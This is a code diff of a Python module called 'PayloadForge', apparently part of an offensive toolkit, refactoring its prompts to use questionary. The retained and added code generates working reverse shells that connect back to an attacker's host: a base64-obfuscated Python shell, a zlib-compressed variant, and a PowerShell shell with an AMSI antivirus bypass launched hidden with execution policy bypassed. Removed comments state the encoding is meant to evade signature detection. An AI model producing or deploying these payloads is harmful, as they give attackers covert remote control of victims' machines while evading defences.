@@ -2,12 +2,13 @@ import os
 import random
 import string
 import base64
-import textwrap
+import questionary
 from rich.console import Console
 from rich.panel import Panel
-from core.ui import draw_header
+from core.ui import draw_header, Q_STYLE
 
 console = Console()
+
 
 class PayloadForge:
     def __init__(self):
@@ -20,10 +21,6 @@ class PayloadForge:
         return f"{self.output_dir}/{name}.{extension}"
 
     def forge_python_revshell(self, lhost, lport):
-        """
-        Forges an obfuscated Python reverse shell.
-        Uses Base64 encoding and dynamic execution to bypass basic string-based signatures.
-        """
         raw_code = f"""
 import socket, os, pty, base64
 def connect():
@@ -38,21 +35,11 @@ def connect():
         pass
 connect()
         """.strip()
-        
-        # Obfuscate using Base64
         encoded_payload = base64.b64encode(raw_code.encode()).decode()
-        obfuscated_code = f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"
-        return obfuscated_code
+        return f"import base64,exec;exec(base64.b64decode('{encoded_payload}'))"
 
     def forge_powershell_revshell(self, lhost, lport):
-        """
-        Forges a PowerShell reverse shell with an integrated AMSI bypass.
-        AMSI (Antimalware Scan Interface) is the primary hurdle for PowerShell scripts.
-        """
-        # A modular AMSI bypass (simple memory patching logic)
         amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
-        
-        # The Core Shell
         shell_logic = f"""
         $c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
         $s = $c.GetStream();
@@ -66,50 +53,43 @@ connect()
         }};
         $c.Close();
         """
-        
         full_script = amsi_bypass + shell_logic.strip()
-        
-        # Base64 encode for 'powershell -EncodedCommand' compatibility
-        # PowerShell expects UTF-16LE for its encoded command parameter
-        encoded_command = base64.b64encode(full_script.encode('utf-16-le')).decode()
-        
-        one_liner = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"
-        return one_liner
+        encoded_command = base64.b64encode(
+            full_script.encode('utf-16-le')).decode()
+        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}"
 
     def run(self):
         draw_header("Payload Forge: msfvenom-Elite")
-        
-        lhost = console.input("[bold yellow]LHOST (Attacker IP): [/bold yellow]").strip()
+
+        lhost = questionary.text("LHOST (Attacker IP):", style=Q_STYLE).ask()
         if not lhost:
-            return console.print("[red][!] LHOST is required.[/red]")
-            
-        lport = console.input("[bold yellow]LPORT (Default 4444): [/bold yellow]").strip() or "4444"
+            return
 
-        console.print(Panel(
-            "[1] Linux/Unix (Python Obfuscated)\n"
-            "[2] Windows (PowerShell Encoded + AMSI Bypass)\n"
-            "[3] macOS (Python Zlib-Compressed)",
-            title="Target Selection",
-            border_style="cyan"
-        ))
-        
-        choice = console.input("\n[forge]> ")
+        lport = questionary.text(
+            "LPORT (Default 4444):", default="4444", style=Q_STYLE).ask()
 
-        if choice == "1":
+        target_type = questionary.select(
+            "Target Environment:",
+            choices=[
+                "Linux/Unix (Python Obfuscated)",
+                "Windows (PowerShell + AMSI Bypass)",
+                "macOS (Python Zlib-Compressed)"
+            ],
+            style=Q_STYLE
+        ).ask()
+
+        if "Linux" in target_type:
             payload = self.forge_python_revshell(lhost, lport)
             fname = self.generate_random_name("py")
-        elif choice == "2":
+        elif "Windows" in target_type:
             payload = self.forge_powershell_revshell(lhost, lport)
             fname = self.generate_random_name("ps1")
-        elif choice == "3":
-            # Extra: Zlib compression for macOS/Linux variation
+        elif "macOS" in target_type:
             import zlib
             raw = self.forge_python_revshell(lhost, lport)
             compressed = base64.b64encode(zlib.compress(raw.encode())).decode()
             payload = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"
             fname = self.generate_random_name("py")
-        else:
-            return console.print("[red][!] Invalid selection.[/red]")
 
         with open(fname, "w") as f:
             f.write(payload)
@@ -121,13 +101,8 @@ connect()
             title="Forge Result",
             border_style="green"
         ))
+        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+
 
 def generate_shell():
-    try:
-        forge = PayloadForge()
-        forge.run()
-    except Exception as e:
-        console.print(f"[bold red][!] Forge Error: {e}[/bold red]")
-
-if __name__ == "__main__":
-    generate_shell()
+    PayloadForge().run()
